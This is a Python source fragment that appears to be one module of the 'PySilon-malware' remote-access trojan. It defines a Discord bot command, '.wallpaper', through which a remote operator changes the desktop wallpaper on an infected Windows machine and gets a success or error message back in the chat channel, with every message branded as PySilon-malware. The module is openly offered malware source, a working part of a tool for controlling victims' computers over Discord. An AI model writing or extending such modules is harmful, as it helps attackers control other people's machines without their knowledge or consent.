import os
import ctypes
import win32con
from getpass import getuser
import discord
from discord.ext import commands

# Annahme, dass 'client' bereits definiert ist

@client.command(name="wallpaper")
async def set_wallpaper(ctx):
    await ctx.message.delete()

    if ctx.message.content.strip() == ".wallpaper":
        embed = discord.Embed(title="📛 Error", description='`Syntax: .wallpaper <path/to/image> (also include the extension)`', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        image_path = ctx.message.content[11:]
        image_path = image_path.replace('\\', '/')

        if os.path.exists(image_path) and os.path.isfile(image_path):
            changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image_path, changed)
            embed = discord.Embed(title="🟢 Success", description=f'```Changed wallpaper successfully!```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error", description='`File doesn\'t exist!`', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
